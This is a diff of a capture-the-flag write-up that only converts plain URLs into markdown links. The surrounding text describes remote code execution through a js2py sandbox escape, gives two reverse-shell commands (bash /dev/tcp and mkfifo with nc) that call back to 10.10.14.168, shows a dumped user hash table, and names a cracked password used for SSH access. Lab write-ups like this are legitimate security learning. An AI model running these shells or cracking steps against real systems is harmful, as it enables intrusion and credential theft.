@@ -41,7 +41,7 @@ def run_code():
         return jsonify({'error': str(e)})
 ```
 
-So, it uses `js2py.eval_js` to execute commands. After googling, i found that we can achieve RCE, and this github repo jumped to me https://github.com/Marven11/CVE-2024-28397-js2py-Sandbox-Escape/.
+So, it uses `js2py.eval_js` to execute commands. After googling, i found that we can achieve RCE, and this github repo jumped to me [https://github.com/Marven11/CVE-2024-28397-js2py-Sandbox-Escape/](https://github.com/Marven11/CVE-2024-28397-js2py-Sandbox-Escape/).
 
 We can use the PoC it supplies:
 ```js
@@ -75,7 +75,7 @@ n11
 ```
 
 We need to change the command, I tried to execute this `sh -i >& /dev/tcp/10.10.14.168/770 0>&1` to achieve remote shell, but it didn't work.
-So, i used other payload from https://www.revshells.com/, I tried with `mkfifo`, and it worked.
+So, i used other payload from [https://www.revshells.com/](https://www.revshells.com/), I tried with `mkfifo`, and it worked.
 ```bash
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.168 770 >/tmp/f
 ```
@@ -124,7 +124,7 @@ sqlite> select * from user;
 2|app|a97588c0e2fa3a024876339e27aeb42e
 ```
 
-using https://crackstation.net/ we managed to crack the password of marco, which is `sweetangelbabylove`.
+using [https://crackstation.net/](https://crackstation.net/) we managed to crack the password of marco, which is `sweetangelbabylove`.
 ![crack station](image-4.png)
 
 I tried to `ssh` to the machine, using the user `marco` and it's password:
